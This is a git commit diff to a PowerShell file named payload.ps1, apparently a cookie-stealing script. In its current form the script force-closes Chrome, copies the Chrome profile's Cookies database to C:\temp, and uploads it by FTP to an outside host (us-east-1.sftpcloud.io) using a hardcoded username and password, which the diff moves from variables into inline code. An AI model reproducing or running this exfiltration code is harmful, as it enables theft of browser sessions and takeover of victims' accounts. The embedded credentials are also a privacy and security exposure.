8a9ba39561e4bec8c40519bf80a18a7684230ccd
mbalochdev <132405677+mbalochdev@users.noreply.github.com>
2024-02-12 16:26:42 +0500

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,7 +1,10 @@
-# FTP server details
-$FTP_HOST = "us-east-1.sftpcloud.io"
-$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
-$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'
+# Close Chrome before running the script
+try {
+    Stop-Process -Name "chrome" -Force -ErrorAction Stop
+    Write-Host "Chrome has been closed."
+} catch {
+    Write-Host "Chrome was not running."
+}
 
 # Directories to work with
 $source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
@@ -14,10 +17,10 @@ function Upload-ToFtp {
         [String]$file_name
     )
     # Load Assembly and create FTPWebRequest to /Cookies directory
-    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
+    $ftpUrl = "ftp://us-east-1.sftpcloud.io/Cookies/$file_name"
     Add-Type -AssemblyName System.Net
     $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
-    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
+    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("d45b8e2d698147e59f2234fd87b98082", 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p')
     $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
     $ftpRequest.UseBinary = $true
     $ftpRequest.KeepAlive = $false
@@ -34,10 +37,16 @@ function Upload-ToFtp {
     Write-Host "Uploaded $file_name to FTP in /Cookies."
 }
 
+# Ensure C:\temp exists or create it
+$temp_folder = "C:\temp"
+if (-not (Test-Path $temp_folder)) {
+    New-Item -Path $temp_folder -ItemType Directory
+}
+
 # Check if the first file exists, then copy and upload
 if (Test-Path $source_directory_1) {
     $file_name = [System.IO.Path]::GetFileName($source_directory_1)
-    $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name
+    $temp_path = Join-Path -Path $temp_folder -ChildPath $file_name
     Copy-Item -Path $source_directory_1 -Destination $temp_path # Copy the file to a temporary location
     Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
     Remove-Item -Path $temp_path # Clean up the temporary file
